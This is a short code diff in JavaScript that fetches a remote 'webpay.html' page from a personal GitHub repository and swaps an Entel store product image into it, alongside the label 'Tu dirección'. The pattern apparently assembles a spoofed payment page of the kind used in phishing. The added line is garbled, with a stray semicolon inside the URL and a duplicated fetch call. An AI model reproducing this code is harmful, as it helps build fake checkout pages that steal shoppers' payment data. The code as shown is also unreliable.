@@ -32,8 +32,7 @@ else{
   text = &#39;Tu dirección&#39;;
 }
 
-
-fetch(&#39;https://www.youtube.com/watch?v=ZZ5LpwO-An4&#39;)
+fetch(&#39;https://raw.githubusercontent.com/rgomezle/TestinG/main/webpay.html;&#39;)fetch(&#39;https://raw.githubusercontent.com/rgomezle/TestinG/main/webpay.html&#39;)
 .then(response =&gt; response.text())
 .then(data =&gt; {
   data = data.replace(&#39;https://tiendaempresas.entel.cl/media/catalog/product/cache/5fe35dce3011af963aa6662d761f86c8/2/1/21cargadorok.png&#39;, url_img);
